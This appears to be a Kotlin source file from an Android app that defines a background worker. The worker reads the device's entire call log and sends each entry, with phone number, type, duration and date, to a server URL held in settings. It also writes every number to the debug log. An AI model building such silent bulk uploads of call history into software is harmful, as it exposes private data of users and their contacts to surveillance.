package com.example.call_logs

import android.content.Context
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.example.call_logs.viewmodel.UrlApiViewModel
import com.example.call_logs.viewmodel.UrlDataStoreViewModel
import android.Manifest
import android.content.pm.PackageManager
import android.provider.CallLog
import android.util.Log
import org.koin.java.KoinJavaComponent.inject

class CallLogWorker(
    context:Context, // provided by WorkManager
    params: WorkerParameters, // provided by WorkManager
): CoroutineWorker(context, params) {

    private val apiViewModel: UrlApiViewModel by inject(UrlApiViewModel::class.java)
    private val dataStoreViewModel: UrlDataStoreViewModel by inject(UrlDataStoreViewModel::class.java)

    override suspend fun doWork(): Result{
        Log.d("CallLogWorker", "CallLogWorker started")
        val permission = ContextCompat.checkSelfPermission(applicationContext, Manifest.permission.READ_CALL_LOG)

        if(permission != PackageManager.PERMISSION_GRANTED){
            Log.d("CallLogWorker", "Permission denied")
            return Result.failure()
        }

        val cursor = applicationContext.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null)
        if (cursor == null) {
            Log.d("CallLogWorker", "Cursor is null. No call logs found.")
        } else {
            Log.d("CallLogWorker", "Cursor obtained. Processing call logs.")
        }
        cursor?.use {
            val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
            val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
            val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)
            val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)

            while (it.moveToNext()) {
                val phoneNumber = it.getString(numberIndex)
                val callType = it.getInt(typeIndex)
                val callDuration = it.getString(durationIndex)
                val callDate = it.getLong(dateIndex)

                val callTypeString = when (callType) {
                    CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                    CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                    CallLog.Calls.MISSED_TYPE -> "MISSED"
                    else -> "UNKNOWN"
                }

                // Create the CallLog model object
                val callLog = com.example.call_logs.data.model.CallLog(
                    mobileNumber = phoneNumber,
                    callType = callTypeString,
                    callDuration = callDuration,
                    callDate = callDate.toString()
                )
                Log.d("CallLogWorker", "Adding call log: ${callLog.mobileNumber}, ${callLog.callType}, ${callLog.callDuration}, ${callLog.callDate}")
                apiViewModel.sendCallLogs(callLog, dataStoreViewModel.accessUrl().toString())
                apiViewModel.addCallLog(callLog)
            }
        }

        return Result.success()
    }

}